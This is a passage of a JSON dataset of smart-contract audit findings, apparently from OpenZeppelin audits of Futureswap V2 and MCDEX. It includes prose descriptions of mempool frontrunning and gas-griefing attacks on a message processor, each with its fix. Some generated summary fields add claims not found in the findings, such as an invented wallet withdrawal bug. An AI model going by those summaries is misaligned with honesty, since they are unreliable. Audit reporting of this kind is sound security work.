      "content": "Anyone can take the `oracleMessage` and `oracleSignature` from a valid transaction in the mempool  whether it is being broadcast by an oracle, or by a user who sets their `userInteractionNumber` to an odd number  and rebroadcast it in their own function call using a one-wei-higher gas price. This frontruns the honest senders transaction and gives the frontrunner the reward from [`maybePaySender`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L804). It also results in the honest sender wasting gas (because their transaction will revert when `reserve` is called by [`ensureUnusedUserInteractionNumber`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L631) in the [`verifyCommonParams` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L538).\n\n\nThis is profitable for the frontrunner as long as the `amount` of the reward from `maybePaySender` is greater than the cost of gas used to frontrun. Under these conditions, one could expect bots to frontrun all `MessageProcessor` interactions of this type. While the users trades would execute as intended, the honest senders would operate at a loss.\n\n\nConsider adding access controls so that only `userMessage.signer`, or a valid oracle, can successfully call the functions that invoke the `maybePaySender` function.\n\n\n**Update:** *Fixed in [PR #494](https://github.com/futureswap/fs-core/pull/494), where the relayer must now be approved by a trusted offline stamper in order to submit the users message and signature.*",
      "summary": "\nThis bug report is about a vulnerability in the MessageProcessor contract of the Futureswap Core project. The vulnerability allows anyone to take a valid transaction from the mempool and rebroadcast it with a higher gas price, which frontruns the honest sender's transaction and results in the honest sender wasting gas. This is profitable for the frontrunner as long as the reward from the transaction is greater than the cost of gas used to frontrun. This could lead to bots frontrunning all MessageProcessor interactions of this type. \n\nTo fix this vulnerability, the report suggests adding access controls so that only the user's signer or a valid oracle can successfully call the functions that invoke the maybePaySender function. This issue has been fixed in Pull Request #494, where the relayer must now be approved by a trusted offline stamper in order to submit the users message and signature.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11132",
      "title": "[H02] Liquidity rewards are computed incorrectly for a week if any liquidity provider removes liquidity during the week",
      "impact": "HIGH",
      "content": "The [`calculateLiquidityProviderPayout` function](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/incentives/Incentives.sol#L359) computes the amount of FST rewards that a liquidity provider should earn in proportion to the share of `totalLiquidity` that they provided. However, the function [assumes](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/incentives/Incentives.sol#L370) that the `totalLiquidity` provided for the week is `liquidityToken.totalSupplyAt(weekEntry.snapShotId)`. This assumption is incorrect if any liquidity providers have removed liquidity after the snapshot was taken and before the end of the week. The error results in liquidity providers receiving fewer FST rewards than they ought to receive. The size of the error scales with the total amount of liquidity that has been removed, and so can be exacerbated by a malicious whale.\n\n\nThis is a known issue that is described [in a code comment](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/incentives/Incentives.sol#L321-L329) within the `payoutLiquidityProvider` function. In the comment, a valid solution to the problem is proposed:\n\n\n\n> \n>  Solution: To decrement the total supply of liquidity for that week when a LP withdraws up to a maximum of their starting balance.\n> \n> \n> \n\n\nHowever, this solution is not implemented in the code. Consider implementing this solution.\n\n\n**Update:** *Fixed in [PR #526](https://github.com/futureswap/fs-core/pull/526), where the solution in the code comment mentioned above has been implemented.*",
      "summary": "\nThis bug report is about the `calculateLiquidityProviderPayout` function in the `Incentives.sol` code. This function is used to compute the amount of FST rewards that a liquidity provider should earn in proportion to the share of total liquidity they provided. However, the function assumes that the total liquidity provided for the week is the same as the `totalSupplyAt` the snapshot was taken. This assumption is incorrect if any liquidity providers have removed liquidity after the snapshot and before the end of the week, resulting in liquidity providers receiving fewer FST rewards than they ought to get. \n\nA solution to the problem was proposed in a code comment within the `payoutLiquidityProvider` function, which suggests to decrement the total supply of liquidity for that week when a LP withdraws up to a maximum of their starting balance. However, this solution was not implemented in the code. \n\nThe issue has now been fixed in PR #526, where the solution in the code comment mentioned above was implemented.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11131",
      "title": "[H01] Attackers can prevent honest users from performing an instant withdraw from the Wallet contract",
      "impact": "HIGH",
      "content": "An attacker who sees an honest users call to [`MessageProcessor.instantWithdraw`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L410) in the mempool can grab the `oracleMessage` and `oracleSignature` parameters from the users transaction, then submit their own transaction to `instantWithdraw` using the same parameters, a higher gas price (so as to frontrun the honest users transaction), and carefully choosing the gas limit for their transactions such that the internal call to the `callInstantWithdraw` will fail [on line 785](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L785) with an out-of-gas error, but will successfully execute the [`if(!success)` block](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol#L431-LL440).\n\n\nThe result is that the attackers instant withdraw will fail (so the user will not receive their funds), but the `userInteractionNumber` will be successfully reserved by the `ReplayTracker`. As a result, the honest users transaction will revert because it will be attempting to use a `userInteractionNumber` that is no longer valid.\n\n\nConsider adding an access control mechanism to restrict who can submit `oracleMessage`s on behalf of the user.\n\n\n**Update:** *Fixed in [PR #494](https://github.com/futureswap/fs-core/pull/494/files), where the relayer who transmits the transaction must be approved by a trusted offline stamper, and in PRs [#533](https://github.com/futureswap/fs_core/pull/533) and [#537](https://github.com/futureswap/fs-core/pull/537), where the user can now specify a minimum amount of gas that must be passed along by the relayer.*",
      "summary": "\nThis bug report describes a vulnerability in the MessageProcessor.instantWithdraw function of the Futureswap core. An attacker can see an honest user's call to the function in the mempool, grab the oracleMessage and oracleSignature parameters from the user's transaction, and submit their own transaction to instantWithdraw using the same parameters and a higher gas price. The attacker can then carefully choose the gas limit for their transaction such that the internal call to the callInstantWithdraw will fail with an out-of-gas error, but will successfully execute the if(!success) block. This means the attacker's instant withdraw fails, but the userInteractionNumber is still reserved by the ReplayTracker. As a result, the honest user's transaction reverts because it is attempting to use an invalid userInteractionNumber.\n\nTo fix this vulnerability, access control mechanisms have been added to restrict who can submit oracleMessages on behalf of the user. This is done in PRs #494, #533, and #537, where the relayer must be approved by a trusted offline stamper and the user can specify a minimum amount of gas that must be passed along by the relayer.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11130",
      "title": "Rewards",
      "impact": "HIGH",
      "content": "Liquidity providers who keep their liquidity in an exchange for an entire week-long window earn rewards in the form of Futureswap tokens (FST). Similarly, users who trade on a Futureswap exchange also earn FST.\n\n\nWhen users sign messages to close a trade, their message contains a referral address. This address also receives FST rewards, and is a way for third-party UIs to profit from users who user their UI. (Users can, of course, add their own address as the `referral` address).\n\n\nThe FST are non-transferable tokens, and are used to vote on governance decisions.",
      "summary": "\nFutureswap is a decentralized exchange that rewards users for providing liquidity and trading on the exchange. Liquidity providers who keep their liquidity on the exchange for an entire week-long window earn rewards in the form of Futureswap tokens (FST). Similarly, traders who use the exchange also earn FST. When users sign messages to close a trade, their message contains a referral address. This address also receives FST rewards, and is a way for third-party UIs to profit from users who use their UI. Users can also add their own address as the referral address. FST is a non-transferable token and is used to vote on governance decisions.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11129",
      "title": "Exchanges",
      "impact": "HIGH",
      "content": "A Futureswap [`Exchange`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/exchange/Exchange.sol) is defined by [an asset token and a stablecoin](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/exchange/Exchange.sol#L31). An exchange can be created by governance via the [`ExchangeFactory`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/exchange/ExchangeFactory.sol). Liquidity providers can add liquidity to the exchange, in exchange for non-transferable [liquidity tokens](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/liquidity/LiquidityToken.sol). These liquidity tokens represent a share of the exchanges liquidity and can be redeemed.\n\n\nTraders can open leveraged long or short positions with up to 20x leverage.",
      "summary": "\nFutureswap is a decentralized exchange platform that allows users to trade assets with up to 20x leverage. The exchange is created by governance via the ExchangeFactory and liquidity can be added to the exchange by liquidity providers in exchange for non-transferable liquidity tokens. These tokens represent a share of the exchanges liquidity and can be redeemed. Traders can open leveraged long or short positions with up to 20x leverage. This bug report is about the ExchangeFactory, which is responsible for creating the exchange. It is defined by an asset token and a stablecoin, and is used to add liquidity to the exchange.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11128",
      "title": "Meta transactions and off-chain oracles",
      "impact": "HIGH",
      "content": "Futureswap leverages meta-transactions and a trusted off-chain oracle in a novel way in order to prevent oracle frontrunning issues. First, the user signs a message containing the parameters that describe the action they want to take. For example, if they want to open a long position, they would sign parameters that indicate which asset they want exposure to, how much capital they want to put at risk, how much leverage they want to use, the min and max asset prices theyre willing to tolerate, etc.\n\n\nNext, the user (or a relayer) passes this signature and message to the off-chain oracle, which appends price information for the asset and stablecoins being used, the time at which the oracle signed the message, etc. In this way, the oracles signed message *includes* the users message and signature, in addition to price data and any other data needed to execute the users intended action.\n\n\nFinally, the oracles message and signature can then be used to execute the operation by passing them along as parameters in a function call to the Futureswap [`MessageProcessor` contract](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/messageProcessor/MessageProcessor.sol).  \n\nThe `MessageProcessor` contract enforces the user-chosen bounds. In this way, the oracle cannot force a user to take any action without the user agreeing.\n\n\nEach user message contains a user-chosen nonce (`userInteractionNumber`), which is tracked by the meta transactions system to prevent signature replays.\n\n\n**Update:** *The meta transaction system now requires a signature from a verifier that double-checks the information provided by the oracle. It also now requires a signature from a stamper that restricts which addresses can relay transactions in the case that the user does not submit their own transaction. These updates are from commit [`3e3a05646d6cac72d07b0dea5db8df9da95df654`](https://github.com/futureswap/fs-core/commit/3e3a05646d6cac72d07b0dea5db8df9da95df654) and [PR #494](https://github.com/futureswap/fs-core/pull/494), respectively.*",
      "summary": "\nFutureswap is a platform that uses meta-transactions and a trusted off-chain oracle to prevent oracle frontrunning issues. A user signs a message containing parameters that describe the action they want to take such as the asset, capital, leverage, min and max asset prices, etc. This message is passed to the oracle which appends price information and the time at which it was signed. This signed message is then passed to the Futureswap MessageProcessor contract which enforces the user-chosen bounds. To prevent signature replays, each user message contains a user-chosen nonce.\n\nRecently, updates were made to the meta transaction system to require a signature from a verifier and stamper. The verifier double-checks the information provided by the oracle and the stamper restricts which addresses can relay transactions in the case that the user does not submit their own transaction. These updates can be found in commit 3e3a05646d6cac72d07b0dea5db8df9da95df654 and PR #494.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11127",
      "title": "Wallet",
      "impact": "HIGH",
      "content": "All user funds enter and exit through Futureswaps [`Wallet` contract](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/wallet/Wallet.sol). The Futureswap exchanges work only with ERC20 tokens that have 18 decimals. Futureswap can support tokens that have fewer than 18 decimals because the `Wallet` contract wraps them in a [`DecimalPaddingToken`](https://github.com/futureswap/fs_core/blob/96255fc4a550a5f34681c117b5969b848d07b3a3/contracts/wallet/DecimalPaddingToken.sol) contract, which the exchanges will use in lieu of the original, decimal-deficient token.",
      "summary": "\nFutureswap is a platform that allows users to enter and exit funds through its Wallet contract. It supports ERC20 tokens that have 18 decimals, but can also support tokens with fewer decimals by wrapping them in a DecimalPaddingToken contract. This contract then acts as the token on the exchange instead of the original token. However, a bug has been discovered where if a user withdraws tokens with fewer than 18 decimals, they will not be able to withdraw the full amount of tokens.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Futureswap V2 Audit",
      "source_link": "https://blog.openzeppelin.com/futureswap-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11279",
      "title": "[L16] Function __BaseFund_init is marked internal but is never called",
      "impact": "LOW",
      "content": "The [`__BaseFund_init` function](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/BaseFund.sol#L52-L71) in the `BaseFund` contract is [marked as `internal`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/BaseFund.sol#L59) but this function is not called anywhere within the codebase.\n\n\nSince this is an `initializer` function, consider either calling it within the codebase or mark the function `external`.\n\n\n**Update:** *Fixed in [PR #17](https://github.com/mcdexio/mai-fund-protocol/pull/17).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Fund Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-fund-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11278",
      "title": "[L15] Zero address can be set as the fund manager",
      "impact": "LOW",
      "content": "The [`setManager` function](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/implement/SocialTradingFund.sol#L79-L93) in the `SocialTradingFund` contract allows the owner to set a fund manager. However, this function does not check if the [input `newManager` address](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/implement/SocialTradingFund.sol#L79) is a zero address.\n\n\nThis scenario does not break the code since the check in the [`_withdrawManagementFee`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/implement/SocialTradingFund.sol#L126-L140) function [prevents the payment of management fee to a zero address](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/implement/SocialTradingFund.sol#L130-L132) and the owner can always change the manager from zero address to a valid address by calling the `setManager` function. However, in order to remove any confusion, consider putting a check in `setManager` function to ensure that the value of `newManager` is not a zero address.\n\n\n**Update:** *Fixed in [PR #22](https://github.com/mcdexio/mai-fund-protocol/pull/22).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Fund Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-fund-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11277",
      "title": "[L14] Mismatch between interface and contract",
      "impact": "LOW",
      "content": "The [`removeBroker` function](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/interface/IGlobalConfig.sol#L11) in the [`IGlobalConfig` interface](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/interface/IGlobalConfig.sol) does not accept an input parameter. However, the [implementation of this interface](https://github.com/mcdexio/mai-protocol-v2/blob/090dcd0c7980760a7b85eafc449dbb7164bae32d/contracts/global/GlobalConfig.sol#L49-L52), which is in the [`mai-protocol-v2` repository](https://github.com/mcdexio/mai-protocol-v2/tree/090dcd0c7980760a7b85eafc449dbb7164bae32d), accepts [`address broker`](https://github.com/mcdexio/mai-protocol-v2/blob/090dcd0c7980760a7b85eafc449dbb7164bae32d/contracts/global/GlobalConfig.sol#L49) as an input parameter.\n\n\nAlthough `Mai Protocol V2` is out-of-scope for this audit, the team identified that this mismatch also exists in the [`removeBroker` function](https://github.com/mcdexio/mai-protocol-v2/blob/090dcd0c7980760a7b85eafc449dbb7164bae32d/contracts/interface/IGlobalConfig.sol#L21) of the [`IGlobalConfig` interface](https://github.com/mcdexio/mai-protocol-v2/blob/090dcd0c7980760a7b85eafc449dbb7164bae32d/contracts/interface/IGlobalConfig.sol) in the `mai-protocol-v2` repo. The latest commit of the `mai-protocol-v2` project at the time of this audit is `090dcd0c7980760a7b85eafc449dbb7164bae32d`.\n\n\nConsider adding the `(address broker)` as an input parameter to the `removeBroker` function of the `IGlobalConfig` interface for both `mai-fund-protocol` and `mai-protocol-v2` projects.\n\n\n**Update:** *Fixed in [PR #21](https://github.com/mcdexio/mai-fund-protocol/pull/21) for `mai-fund-protocol` project and [PR #14](https://github.com/mcdexio/mai-protocol-v2/pull/14) for the `mai-protocol-v2` project.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Fund Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-fund-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11276",
      "title": "[L13] It is not possible to redeem right when the locking period ends",
      "impact": "LOW",
      "content": "The [`_canRedeem` function](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/component/ERC20CappedRedeemable.sol#L113-L122) in the `ERC20CappedRedeemable` contract implements a check which ensures that, after purchasing the shares, users wait for a specific time period before they can redeem those shares. The system ensures that as soon as [the current timestamp is greater than the wait period](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/component/ERC20CappedRedeemable.sol#L121), the user is [allowed to redeem](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/BaseFund.sol#L222). However, this conditional check misses the scenario where the current timestamp can be equal to the wait period.\n\n\nConsider allowing users to redeem as soon as the wait period is reached, updating [the `&lt;` comparison operator](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/component/ERC20CappedRedeemable.sol#L121) to `&lt;=`. Alternatively, if this is by design, consider explicitly documenting that in order to reedeem, users will have to wait until the block after the locking period ends.\n\n\n**Update:** *Fixed in [PR #20](https://github.com/mcdexio/mai-fund-protocol/pull/20).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Fund Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-fund-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11275",
      "title": "[L12] Unnecessary return variables",
      "impact": "LOW",
      "content": "In the codebase, there are instances where functions return an unnecessary value.\n\n\nFor example, in the `Collateral` contract, the [function `_pullFromUser`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/component/Collateral.sol#L108-L119) returns a [variable `rawAmount`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/component/Collateral.sol#L118). However, the value of [this variable is passed as an input](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/component/Collateral.sol#L108) to the function, thus making the return variable unnecessary.\n\n\nSimilarly, the [`_pushToUser` function](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/component/Collateral.sol#L127-L138) in the `Collateral` contract [returns the `rawAmount` variable](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/component/Collateral.sol#L137) unnecessarily.\n\n\nIn order to reduce the surface for error and reduce developer confusion, please consider removing any unused return variables.\n\n\n**Update:** *Fixed in [PR #19](https://github.com/mcdexio/mai-fund-protocol/pull/19). Additionally, [an unused return value from the `_updateFee` function](https://github.com/mcdexio/mai-fund-protocol/pull/19/files#diff-5d246c8509dbb44a981c3fa981d27e1bac668bc9cbe705487aaa6290c3cbcbb8) has been removed.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Fund Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-fund-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11274",
      "title": "[L11] Unfixed version of contracts-ethereum-package",
      "impact": "LOW",
      "content": "The [OpenZeppelin `contracts-ethereum-package` library](https://github.com/OpenZeppelin/openzeppelin-contracts-ethereum-package) is used throughout the code. However, [when it is imported](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/package.json#L13), the version that is used is not fixed.\n\n\nTo protect against unexpected changes that may affect the code, consider pinning a specific version of `openzeppelin-contracts-ethereum-package`.\n\n\n**Update:** *Fixed in [PR #18](https://github.com/mcdexio/mai-fund-protocol/pull/18).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Fund Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-fund-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11273",
      "title": "[L10] Outdated solidity version used in the IAggregator contract",
      "impact": "LOW",
      "content": "[An outdated and unpinned version of solidity](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/interface/IAggregator.sol#L2) is used in the `IAggregator` contract.\n\n\nConsider pinning the version of the Solidity compiler to its latest stable version. This should help prevent introducing unexpected bugs due to incompatible future releases. To choose a specific version, developers should consider both the compilers features needed by the project and [the list of known bugs associated](https://solidity.readthedocs.io/en/latest/bugs.html) with each Solidity compiler version.\n\n\n**Update:** *Fixed in [PR #23](https://github.com/mcdexio/mai-fund-protocol/pull/23).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Fund Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-fund-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11272",
      "title": "[L09] Unnecessary frequent reads from storage in loops",
      "impact": "LOW",
      "content": "Within the function [`buckets` in the `PeriodicPriceBucket` contract](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/PeriodicPriceBucket.sol#L55), the [for loop](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/PeriodicPriceBucket.sol#L62) checks the value of `_periods.length()` on each iteration. Since this function is already potentially gas-intensive (due to looping) consider accessing [`bucketCount`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/PeriodicPriceBucket.sol#L60) for the looping condition. This may help to prevent out-of-gas errors and will improve gas efficiency.\n\n\nSimilarly, [the for loop inside the `updatePrice` function](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/PeriodicPriceBucket.sol#L128) uses `_periods.length()` in its looping condition. Consider declaring a memory object, setting it to `_periods.length()`, and using that value in the looping condition instead of `_periods.length()`.\n\n\n**Update:** *Fixed in [PR #16](https://github.com/mcdexio/mai-fund-protocol/pull/16).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Fund Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-fund-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11271",
      "title": "[L08] Inconsistent use of return variables",
      "impact": "LOW",
      "content": "There is an inconsistency in the use of named return variables across the entire code base. For example, there are instances where the returned variables are named and not declared within the function, such as in the [`wmul` function in `LibMathEx` library](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/lib/LibMathEx.sol#L14) and there are instances where the return variables are unnamed, such as in the [`set` function in `LibEnumerableMap` library](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/lib/LibEnumerableMap.sol#L29).\n\n\nConsider removing all named return variables and explicitly declaring them as local variables where needed. This should improve both explicitness and readability of the project.\n\n\n**Update:** *Acknowledged. The Monte Carlo team has decided to keep the code as-is for the current version.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Fund Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-fund-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11270",
      "title": "[L07] wmul and wdiv round incorrectly in some cases",
      "impact": "LOW",
      "content": "Within the [`LibMathEx`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/lib/LibMathEx.sol#) library, the [`wdiv`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/lib/LibMathEx.sol#L31) function adds [half of the divisor](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/lib/LibMathEx.sol#L32) to the dividend before dividing by it. This is done to assist in rounding, since division natively truncates (rounds down). By adding half, any divisions which in conventional mathematics should round up, will do so in this code.\n\n\nHowever, this function always adds half of the divisor, even when the dividend and divisor have opposite signs. This decreases the absolute value of the result, when it should be increasing it, and the end result is that the returned value is less accurate than it should be. For instance, when calling this function with the values `(-200, 40)` or `(100, -40)`, the results are `-4.999...e18` and `-2.4999...e18` respectively, when they should be `-5e18` and `-2.5e18`. This is especially noteworthy given that inputs of `(200, 40)` and `(100, 40)` result in `5e18` and `2.5e18`.\n\n\nSimilarly, for the [`wmul`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/lib/LibMathEx.sol#L27) function, when the signs of `x` and `y` differ, the answer will be inaccurate. This can be seen by calling this function with input `(5e18, 0.5e18)`, and comparing this result to that of the input `(-5e18, 0.5e18)` or `(5e18, -0.5e18)`.\n\n\nSolidity will round towards 0 when truncating. To counteract the effect of adding two numbers of different sign, consider adding logic to the [`wdiv`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/lib/LibMathEx.sol#L31) function such that when `x` and `y` are opposite signs, the [`.add` on line 32](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/lib/LibMathEx.sol#L32) is replaced by a `.sub`. For the [`wmul`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/lib/LibMathEx.sol#L27) function, very similar logic should be implemented, such that the [`.add` on line 28](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/lib/LibMathEx.sol#L28) should be replaced by `.sub` only when the signs of `x` and `y` differ. Various combinations of positive and negative values should be tested to ensure correct functionality.\n\n\n**Update:** *Fixed in [PR #15](https://github.com/mcdexio/mai-fund-protocol/pull/15).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Fund Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-fund-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11269",
      "title": "[L06] Misleading, incomplete or missing docstrings",
      "impact": "LOW",
